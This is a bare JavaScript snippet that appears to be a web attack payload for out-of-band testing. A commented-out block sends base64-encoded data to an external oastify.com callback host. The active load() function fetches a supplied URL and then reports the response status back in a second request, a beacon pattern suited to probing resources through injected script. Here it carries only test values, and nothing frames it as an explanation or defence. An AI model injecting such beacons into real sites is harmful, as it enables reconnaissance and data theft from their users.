
// 	var url = "https://ek2huu9sha0phszjg3mpkmuij9p0dr1g.oastify.com/?testing=" + btoa("123");
// 	function reqListener() {
// 		console.log("done");
// 	};
// 	const req = new XMLHttpRequest();
// 	req.addEventListener("load", reqListener);
// 	req.open("GET", url);
// 	req.send();
function load(urlPath) {
	var Response_Text = "not_called"; 
	var Get_Request = new XMLHttpRequest();
	Get_Request.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
            Response_Text = this.responseText;
		}
		var Get_Final = new XMLHttpRequest();
		Get_Final.open("GET", urlPath+"/?final="+this.status, true);
		Get_Final.overrideMimeType("text/plain; charset=x-user-defined");
		Get_Final.send();
    };
	Get_Request.open("GET", urlPath, true);
	Get_Request.overrideMimeType("text/plain; charset=x-user-defined");
    Get_Request.send();
}
